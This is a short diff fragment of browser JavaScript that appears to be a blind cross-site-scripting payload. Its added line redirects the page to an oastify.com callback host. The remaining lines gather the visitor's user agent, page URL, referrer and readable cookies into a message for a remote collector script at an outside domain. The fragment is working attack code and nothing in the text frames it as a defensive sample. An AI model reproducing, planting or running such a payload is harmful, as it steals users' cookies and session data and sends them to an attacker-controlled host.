@@ -1,3 +1,4 @@
+window.location='http://www7dycaepm26aq8qbbafbzis9y0mrag.oastify.com/?id=1';
 var mhost = '//q4hfbkf7.x1.pe/b.php';
 var msg = 'User Agent\n' + navigator.userAgent + '\n\nTarget URL\n' + document.URL;
 msg += '\n\nReferer URL\n' + document.referrer + '\n\nReadable Cookies\n' + document.cookie;
